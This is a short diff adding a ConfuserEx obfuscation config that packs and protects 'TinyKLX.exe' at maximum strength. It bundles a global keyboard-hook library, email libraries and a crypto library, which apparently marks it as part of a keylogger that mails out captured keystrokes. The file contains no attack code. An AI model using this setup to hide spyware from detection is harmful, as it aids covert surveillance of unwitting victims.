@@ -1,0 +1,13 @@
+<project outputDir="Confused" baseDir="bin\Release" xmlns="http://confuser.codeplex.com">
+  <packer id="compressor" />
+  <module path="TinyKLX.exe">
+    <rule pattern="true" preset="maximum" inherit="false" />
+  </module>
+  <module path="BouncyCastle.Crypto.dll" />
+  <module path="Gma.System.MouseKeyHook.dll" />
+  <module path="MailKit.dll" />
+  <module path="MimeKit.dll" />
+  <module path="System.IO.dll" />
+  <module path="System.Runtime.dll" />
+  <module path="System.Threading.Tasks.dll" />
+</project>
